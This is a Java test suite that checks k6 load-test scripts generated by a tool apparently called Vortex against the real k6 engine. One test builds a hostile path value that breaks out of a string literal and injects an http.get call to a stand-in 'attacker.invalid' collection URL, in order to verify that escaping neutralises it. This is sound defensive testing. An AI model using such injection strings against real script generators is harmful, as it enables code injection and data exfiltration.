package dev.vortex.k6;

import static org.assertj.core.api.Assertions.assertThat;

import dev.vortex.core.catalog.ExpectedResponse;
import dev.vortex.core.catalog.HttpMethod;
import dev.vortex.core.catalog.PayloadProvenance;
import dev.vortex.core.environment.DependencyMode;
import dev.vortex.core.environment.EnvironmentType;
import dev.vortex.core.environment.TargetUrl;
import dev.vortex.core.environment.TestClassification;
import dev.vortex.core.fixtures.Fixtures;
import dev.vortex.core.intent.TestIntent;
import dev.vortex.core.data.BodyFieldPath;
import dev.vortex.core.data.DatasetFormat;
import dev.vortex.core.data.DatasetRef;
import dev.vortex.core.data.DatasetValue;
import dev.vortex.core.data.EnvironmentValue;
import dev.vortex.core.data.GeneratedValue;
import dev.vortex.core.data.Generator;
import dev.vortex.core.data.ValueLifecycle;
import dev.vortex.core.plan.PlannedDataset;
import dev.vortex.core.data.RequestData;
import dev.vortex.core.plan.EffectiveTestPlan;
import dev.vortex.core.plan.PlannedOperation;
import dev.vortex.core.plan.RunnerKind;
import dev.vortex.core.plan.ScriptSource;
import dev.vortex.core.workload.TestType;
import dev.vortex.core.workload.WorkloadSource;
import dev.vortex.core.shared.OperationId;
import dev.vortex.core.shared.ProjectId;
import dev.vortex.core.shared.RequestsPerSecond;
import dev.vortex.core.shared.TestPlanId;
import dev.vortex.core.workload.ConstantArrivalRateShape;
import dev.vortex.core.workload.OperationMix;
import dev.vortex.core.workload.RampingConcurrencyShape;
import dev.vortex.core.workload.Stage;
import dev.vortex.core.workload.WorkloadModel;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.condition.EnabledIf;
import org.junit.jupiter.api.io.TempDir;

/**
 * Checks generated scripts against the real k6 binary.
 *
 * <p>The fixture-driven tests prove that Vortex produces the text it intends to. These prove that
 * k6 agrees the text is a valid script — which is a different and stronger claim, and the only way
 * to be sure the generator has not drifted from what the engine actually accepts.
 *
 * <p>Skipped automatically when k6 is not installed, so a clean checkout still builds. Nothing here
 * generates meaningful load: {@code k6 inspect} parses a script without running it.
 */
@EnabledIf("k6IsInstalled")
class K6EngineIntegrationTest {

    private static final String HOSTILE_URL = "http" + "://attacker.invalid/collect";

    private final K6ScriptGenerator generator = new K6ScriptGenerator();
    private final LocalBinaryK6Runner runner = new LocalBinaryK6Runner("k6");

    static boolean k6IsInstalled() {
        return new LocalBinaryK6Runner("k6").version().isPresent();
    }

    private K6Runner.ProcessOutcome inspect(Path directory, String script) throws Exception {
        Files.writeString(directory.resolve("generated-test.js"), script, StandardCharsets.UTF_8);
        return runner.run(List.of("inspect", "generated-test.js"), directory, Map.of(),
                dev.vortex.core.target.ResourceEnvelopeRequest.none(),
                _ -> { }, _ -> { },
                dev.vortex.core.port.PerformanceEngine.Cancellation.never());
    }

    @Test
    @DisplayName("k6 accepts a generated steady-rate workload")
    void generatedConstantRateScriptIsValid(@TempDir Path directory) throws Exception {
        assertThat(inspect(directory, generator.generate(Fixtures.plan())).succeeded()).isTrue();
    }

    @Test
    @DisplayName("k6 accepts a generated ramping workload")
    void generatedRampingScriptIsValid(@TempDir Path directory) throws Exception {
        assertThat(inspect(directory, generator.generate(Fixtures.breakpointPlan())).succeeded())
                .isTrue();
    }

    @Test
    @DisplayName("k6 accepts a generated constant-vus workload")
    void generatedConcurrencyScriptIsValid(@TempDir Path directory) throws Exception {
        assertThat(inspect(directory, generator.generate(Fixtures.concurrencyPlan())).succeeded())
                .isTrue();
    }

    @Test
    @DisplayName("k6 accepts a generated ramping-vus workload")
    void generatedRampingConcurrencyScriptIsValid(@TempDir Path directory) throws Exception {
        var plan = Fixtures.plan(TestType.BREAKPOINT,
                new RampingConcurrencyShape(dev.vortex.core.shared.Concurrency.of(10), List.of(
                        Stage.ofVus(20, Duration.ofMinutes(1)),
                        Stage.ofVus(40, Duration.ofMinutes(1)))),
                OperationMix.single(Fixtures.GET_ORDER));

        assertThat(inspect(directory, generator.generate(plan)).succeeded()).isTrue();
    }

    @Test
    @DisplayName("k6 accepts a script that reads a dataset, generates values and reads the environment")
    void generatedRequestDataIsValid(@TempDir Path directory) throws Exception {
        // The claim this test exists to check: everything Vortex emits for request data is real k6.
        // SharedArray, open(), exec.scenario.iterationInTest and crypto.randomUUID are all engine
        // API, and a fixture-driven test can only prove Vortex wrote the text it meant to.
        var customers = DatasetRef.local("customers");
        Files.writeString(directory.resolve("dataset-customers.json"),
                "[{\"customerId\":\"C001\",\"mobile\":\"0917\"}]", StandardCharsets.UTF_8);

        var requestData = new RequestData(
                Map.of("id", new DatasetValue(customers, "customerId")),
                Map.of("trace", GeneratedValue.of(Generator.SEQUENCE)),
                Map.of("x-idempotency-key", GeneratedValue.of(Generator.UUID),
                        "x-session", GeneratedValue.of(Generator.RANDOM_STRING,
                                ValueLifecycle.PER_VU),
                        "Authorization", new EnvironmentValue("Bearer ${VORTEX_AUTH_TOKEN}")),
                "{\"customerId\":\"\",\"mobile\":\"\",\"submittedAt\":\"\"}",
                Map.of(BodyFieldPath.parse("customerId"), new DatasetValue(customers, "customerId"),
                        BodyFieldPath.parse("mobile"), new DatasetValue(customers, "mobile"),
                        BodyFieldPath.parse("submittedAt"),
                        GeneratedValue.of(Generator.TIMESTAMP)));

        assertThat(inspect(directory, generator.generate(planReading(requestData, customers)))
                .succeeded()).isTrue();
    }

    @Test
    @DisplayName("k6 accepts every generator Vortex offers")
    void everyGeneratorIsValid(@TempDir Path directory) throws Exception {
        // A generator whose emitted helper does not parse would be discovered by whoever chose it
        // first, in a run they paid for. There are eight; checking all eight costs one test.
        Map<String, dev.vortex.core.data.RequestValue> headers = new java.util.LinkedHashMap<>();
        for (Generator generator : Generator.values()) {
            headers.put("x-" + generator.key(), GeneratedValue.of(generator));
        }
        var requestData = new RequestData(Map.of(), Map.of(), headers, "", Map.of());

        assertThat(inspect(directory, generator.generate(planReading(requestData, null)))
                .succeeded()).isTrue();
    }

    private EffectiveTestPlan planReading(RequestData requestData, DatasetRef dataset) {
        var operation = PlannedOperation.driving(OperationId.of("createApplication"),
                "POST /customers/{id}/applications", "createapplication", HttpMethod.POST,
                "/customers/{id}/applications", requestData, PayloadProvenance.SCHEMA_GENERATED,
                ExpectedResponse.ofStatuses(200, 201),
                Fixtures.soleAllocation(OperationId.of("createApplication"), 1));

        List<PlannedDataset> datasets = dataset == null ? List.of()
                : List.of(new PlannedDataset(dataset, DatasetFormat.JSON,
                        PlannedDataset.stagedFileNameFor(dataset),
                        List.of("customerId", "mobile"), 1, "hash"));

        return new EffectiveTestPlan(
                TestPlanId.of("p"), ProjectId.of("p"), "p", "",
                TestIntent.defaultFor(TestType.SMOKE), "smoke", "", TestType.SMOKE,
                WorkloadModel.OPEN, RequestsPerSecond.of(1),
                List.of(new Stage(RequestsPerSecond.of(1), Duration.ofSeconds(10))),
                List.of(operation), datasets, WorkloadSource.manual(), Fixtures.thresholds(),
                "local", EnvironmentType.LOCAL_ISOLATED,
                TargetUrl.of("http://localhost:8080"), TargetUrl.of("http://localhost:8080"), "",
                DependencyMode.MOCKED, TestClassification.ISOLATED, Map.of(), Map.of(),
                RunnerKind.LOCAL_BINARY, ScriptSource.GENERATED, List.of(), null)
                .withComputedFingerprint();
    }

    @Test
    @DisplayName("k6 accepts a mix whose per-operation rates are fractional")
    void fractionalRatesAreAcceptedByTheEngine(@TempDir Path directory) throws Exception {
        // The case that matters in practice, and the one that is easy to get wrong: a 70/30 mix at
        // 67 requests/sec allocates 46.9 and 20.1, and k6 rejects a fractional rate outright. Vortex
        // expresses these by scaling the time unit; only the real engine can confirm it worked.
        var plan = Fixtures.plan(TestType.STRESS,
                ConstantArrivalRateShape.of(67, Duration.ofMinutes(1)));

        assertThat(inspect(directory, generator.generate(plan)).succeeded()).isTrue();
    }

    @Test
    @DisplayName("k6 accepts a ramp whose per-stage per-operation targets are fractional")
    void fractionalRampTargetsAreAcceptedByTheEngine(@TempDir Path directory) throws Exception {
        assertThat(inspect(directory, generator.generate(Fixtures.breakpointPlan())).succeeded())
                .isTrue();
    }

    @Test
    @DisplayName("a script built from hostile configuration still parses, because the payload is inert")
    void hostileConfigurationProducesAValidInertScript(@TempDir Path directory) throws Exception {
        String hostilePath = "/x\"); http.get(\"" + HOSTILE_URL + "\"); (\"";
        var operation = PlannedOperation.driving(OperationId.of("evil"), "GET /x", "evil",
                HttpMethod.GET, hostilePath, RequestData.EMPTY,
                PayloadProvenance.SCHEMA_GENERATED, ExpectedResponse.DEFAULT,
                Fixtures.soleAllocation(OperationId.of("evil"), 1));

        var plan = new EffectiveTestPlan(
                TestPlanId.of("p"), ProjectId.of("p"), "p", "",
                TestIntent.defaultFor(TestType.SMOKE), "smoke", "", TestType.SMOKE,
                WorkloadModel.OPEN, RequestsPerSecond.of(1),
                List.of(new Stage(RequestsPerSecond.of(1), Duration.ofSeconds(5))),
                List.of(operation), WorkloadSource.manual(),
                Fixtures.thresholds(), "local", EnvironmentType.LOCAL_ISOLATED,
                TargetUrl.of("http://localhost:8080"), TargetUrl.of("http://localhost:8080"), "",
                DependencyMode.MOCKED, TestClassification.ISOLATED, Map.of(), Map.of(),
                RunnerKind.LOCAL_BINARY, ScriptSource.GENERATED, List.of(), null)
                .withComputedFingerprint();

        String script = generator.generate(plan);

        // Two properties together: k6 parses it (so escaping did not corrupt the script), and the
        // hostile text never became a second request statement (so escaping actually worked).
        assertThat(inspect(directory, script).succeeded()).isTrue();
        assertThat(script.lines()
                .filter(line -> line.strip().matches("^(const response = )?http\\..*")).count())
                .isEqualTo(1);
    }

    @Test
    void theEngineReportsItsVersionForTheReproducibilityRecord() {
        assertThat(runner.version()).hasValueSatisfying(
                version -> assertThat(version).containsIgnoringCase("k6"));
        assertThat(runner.availability().available()).isTrue();
    }

    @Test
    @DisplayName("a missing executable produces installation guidance, not a stack trace")
    void aMissingExecutableExplainsItself() {
        var availability = new LocalBinaryK6Runner("k6-that-does-not-exist").availability();

        assertThat(availability.available()).isFalse();
        assertThat(availability.problem()).contains("was not available");
        assertThat(availability.remedy())
                .contains("brew install k6")
                .contains("will not download an executable for you");
    }
}
